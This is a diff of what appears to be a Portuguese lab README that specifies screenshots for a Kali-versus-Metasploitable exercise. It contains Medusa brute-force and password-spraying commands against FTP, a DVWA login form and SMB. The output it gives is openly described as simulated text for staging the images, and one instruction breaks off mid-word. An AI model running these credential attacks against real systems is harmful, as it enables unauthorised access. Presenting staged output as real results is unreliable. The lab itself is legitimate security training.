@@ -1,7 +1,78 @@
 imagem
 
-Arquivo Descrição
-topologia.png Diagrama da topologia de rede (Kali ↔ Metasploitable)
-medusa-ftp.png Captura de tela do terminal mostrando o ataque de força bruta no FTP
-medusa-dvwa.png Captura de tela do Medusa atacando o formulário web do DVWA
-medusa-smb.png Captura de tela do password spraying no SMB
+
+
+🖼️ Imagem 1: topologia.png – Diagrama de Rede
+
+Conteúdo necessário:
+Um diagrama simples mostrando duas máquinas conectadas em rede Host-Only.
+
+Texto/desenho que a imagem deve ter:
+
+```
+┌─────────────────────┐          Host-Only Network          ┌──────────────────────┐
+│     Kali Linux      │◄───────────────────────────────────►│  Metasploitable 2     │
+│   Atacante          │                                     │   Alvo                │
+│ IP: 192.168.56.101  │                                     │ IP: 192.168.56.102    │
+│                     │                                     │ Serviços:             │
+│ Ferramentas:        │                                     │  - FTP (porta 21)     │
+│  - Medusa           │                                     │  - HTTP/DVWA (80)     │
+│  - enum4linux       │                                     │  - SMB (445)          │
+└─────────────────────┘                                     └──────────────────────┘
+```
+
+Como criar:
+
+1. Ac
+
+---
+
+🖼️ Imagem 2: medusa-ftp.png – Saída do Medusa no Ataque FTP
+
+Conteúdo necessário:
+Captura de tela de um terminal mostrando o comando e a saída do Medusa com sucesso.
+
+Texto que deve aparecer na imagem (simulação da saída do terminal):
+
+```bash
+root@kali:~# medusa -h 192.168.56.102 -U wordlists/ftp-users.txt -P wordlists/ftp-passwords.txt -M ftp -t 4
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 7, 4 complete) Password: msfadmin (1 of 9 complete)
+ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+```
+
+
+
+---
+
+🖼️ Imagem 3: medusa-dvwa.png – Saída do Medusa no Ataque Web (DVWA)
+
+Texto que deve aparecer na imagem:
+
+```bash
+root@kali:~# medusa -h 192.168.56.102 -U wordlists/web-users.txt -P wordlists/web-passwords.txt -M web-form -m FORM:"dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 2
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [web-form] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 5, 1 complete) Password: password (1 of 6 complete)
+ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
+```
+
+Procedimento: mesmo do anterior, usando o texto acima.
+
+---
+
+🖼️ Imagem 4: medusa-smb.png – Password Spraying no SMB
+
+Texto que deve aparecer na imagem:
+
+```bash
+root@kali:~# medusa -h 192.168.56.102 -U wordlists/smb-users.txt -p "123456" -M smbnt -t 1
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 6, 1 complete) Password: 123456 (1 of 1 complete)
+ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: 123456 [SUCCESS]
+```
